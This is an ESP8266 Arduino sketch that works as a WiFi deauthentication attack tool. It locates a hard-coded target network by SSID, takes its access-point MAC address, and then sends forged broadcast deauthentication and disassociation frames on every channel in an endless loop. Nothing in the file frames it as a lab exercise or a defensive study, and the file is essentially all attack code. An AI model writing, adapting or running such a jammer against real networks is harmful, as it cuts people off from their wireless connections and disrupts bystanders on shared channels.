#include <ESP8266WiFi.h>



int wifiChannelMax = 14;
int detectedNetworkCount = 0;
const char* targetSSID = "reacdoornet";

//IEEE 802.11 WiFi management frame
uint8_t packet[26] =
{
    0xC0, 0x00, //frame control marking it as deauthentication frame
    0x00, 0x00, //duration
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, //mac address of the destination(in this case broadcast i.e. everyone)
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, //source mac address
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, //bssid aka mac address of the access point
    0x00, 0x00, //sequence number
    0x01, 0x00 //reason code
};


bool sendPacket(uint8_t* packet, uint16_t packetSize, uint8_t wifi_channel, uint16_t tries)
{
  wifi_set_channel(wifi_channel);
  bool sent = false;

  for (int i = 0; i < tries && !sent; i++)
  {
    sent = wifi_send_pkt_freedom(packet, packetSize, 0) == 0;
  }

  return sent;
}

bool deauthDevice(uint8_t* mac, uint8_t wifi_channel)
{
    bool success = false;
    uint8_t customPacket[26];
    memcpy(customPacket,packet,26);

    memcpy(&customPacket[10], mac, 6);
    memcpy(&customPacket[16], mac, 6);

    if (sendPacket(customPacket, sizeof(customPacket), wifi_channel, 2))
    {
        success = true;
    }

    // send disassociate frame
    customPacket[0] = 0xa0;

    if (sendPacket(customPacket, sizeof(customPacket), wifi_channel, 2))
    {
        success = true;
    }


    return success;
}


int scanForNetworks()
{
  return WiFi.scanNetworks();
}

void setup()
 {
  // put your setup code here, to run once:
  ESP.eraseConfig();
  WiFi.mode(WIFI_STA);
  WiFi.disconnect();

  delay(1000);
  detectedNetworkCount = scanForNetworks();
  delay(1000);

  uint8_t bssid[6];

  for(int i = 0;i<detectedNetworkCount;i++)
  {
    if(WiFi.SSID(i) == targetSSID)
    {
        memcpy(bssid,WiFi.BSSID(i),6);
        break;
    }
  }



  for(;;)
  {
    for(int c = 1; c <= wifiChannelMax; c++)
    {
      deauthDevice(bssid, c);
      delay(50);
    }
  }
  

}







void loop()
{

}
